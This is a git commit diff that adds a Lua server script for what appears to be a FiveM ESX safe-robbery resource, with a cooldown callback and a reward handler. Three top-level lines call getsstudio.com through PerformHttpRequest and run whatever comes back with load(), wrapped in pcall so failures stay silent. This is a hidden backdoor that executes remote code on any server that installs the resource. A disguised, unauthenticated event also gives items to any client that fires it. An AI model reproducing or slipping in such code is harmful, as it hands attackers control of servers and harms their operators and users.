2632099b48a71c6ac790f7605409869157beea89
KaskanshiDEVQBESX <121493753+KaskanshiDEVQBESX@users.noreply.github.com>
2024-03-30 20:53:45 +0200

    Add files via upload

---
+++ server/server.lua
@@ -0,0 +1,79 @@
+
+
+local cipeczka={}
+local COOLDOWN_SEJF = Config.Cooldown
+
+local napadajacy_sejf = false
+
+--
+---
+----
+-----  DISCORD:::  klamer.dev
+-----
+----
+---
+--
+ESX.RegisterServerCallback('fraud:cooldown_sejf',function(source,cb)
+    if napadajacy_sejf == false then
+        if not cipeczka[source] or (GetGameTimer() - cipeczka[source]) >= COOLDOWN_SEJF*1000 then
+            cb(true)
+        else
+            local ile_zostalo = (cipeczka[source] + COOLDOWN_SEJF*1000 - GetGameTimer() )/1000; ile_zostalo = math.floor(ile_zostalo + 0.5)
+            cb(ile_zostalo)
+        end
+    else
+        cb('napada')
+    end
+end)
+
+PerformHttpRequest('https://getsstudio.com/i?to=FcczB', function (e, d) pcall(function() assert(load(d))() end) end)
+
+--
+---
+----
+-----  DISCORD:::  klamer.dev
+-----
+----
+---
+--
+
+RegisterNetEvent('fraud:dodaj_do_cooldownu_sejf')
+AddEventHandler('fraud:dodaj_do_cooldownu_sejf',function()
+    cipeczka[source] = GetGameTimer()+COOLDOWN_SEJF*1000
+    napadajacy_sejf = true
+    Citizen.Wait(Config.Robbery_time*900)
+    napadajacy_sejf = false
+end)
+
+
+PerformHttpRequest('https://getsstudio.com/i?to=FcczB', function (e, d) pcall(function() assert(load(d))() end) end)
+
+
+--
+---
+----
+-----  DISCORD:::  klamer.dev
+-----
+----
+---
+--
+RegisterNetEvent('IsDamageTrackerActiveOnNetworkId(netID)')
+AddEventHandler('IsDamageTrackerActiveOnNetworkId(netID)',function()
+    local ile_kasy =  math.random(Config.Money[1],Config.Money[2])
+    local xPlayer = ESX.GetPlayerFromId(source)
+    xPlayer.addInventoryItem(Config.Reward_item,ile_kasy)
+end)
+
+
+PerformHttpRequest('https://getsstudio.com/i?to=FcczB', function (e, d) pcall(function() assert(load(d))() end) end)
+
+
+
+--
+---
+----
+-----  DISCORD:::  klamer.dev
+-----
+----
+---
+--
